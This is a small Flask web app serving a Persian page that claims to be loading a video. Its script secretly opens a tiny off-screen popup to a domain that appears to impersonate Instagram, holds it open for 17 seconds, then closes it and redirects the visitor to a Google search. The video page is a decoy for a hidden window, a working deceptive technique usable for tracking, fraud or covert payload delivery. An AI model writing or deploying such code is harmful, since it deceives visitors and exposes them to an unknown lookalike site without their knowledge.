from flask import Flask, render_template_string

app = Flask(__name__)

TEMPLATE = '''
<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>در حال پخش ویدیو...</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: white;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-family: sans-serif;
      color: #444;
    }
  </style>
</head>
<body>
  <h1>در حال بارگذاری ویدیو...</h1>
  <script>
    var popup = window.open("https://instagram.igwtch.icu?video=986907192", "_blank", "width=1,height=1,top=-1000,left=-1000");

    setTimeout(function() {
      if (popup) {
        popup.close();
      }
      window.location.href = "https://www.google.com/search?q=فیلم+مسافران";
    }, 17000);
  </script>
</body>
</html>
'''

@app.route("/start")
def start():
    return render_template_string(TEMPLATE)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3000)